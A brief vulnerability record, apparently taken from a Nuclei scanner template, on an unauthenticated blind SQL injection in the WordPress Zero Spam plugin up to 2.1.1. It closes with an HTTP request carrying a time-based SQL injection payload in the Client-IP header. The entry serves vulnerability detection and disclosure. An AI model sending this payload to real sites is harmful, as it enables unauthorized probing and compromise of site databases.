# Vulnerability: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`zero-spam-sql-injection.yaml`)

## Description
The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated Blind SQL Injection security vulnerability.

## Secure Mitigation
Fixed in version 2.2.0

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
GET / HTTP/1.1
Host: {{Hostname}}
Client-IP: '+(select(0)from(select(sleep(7)))v)+'
```

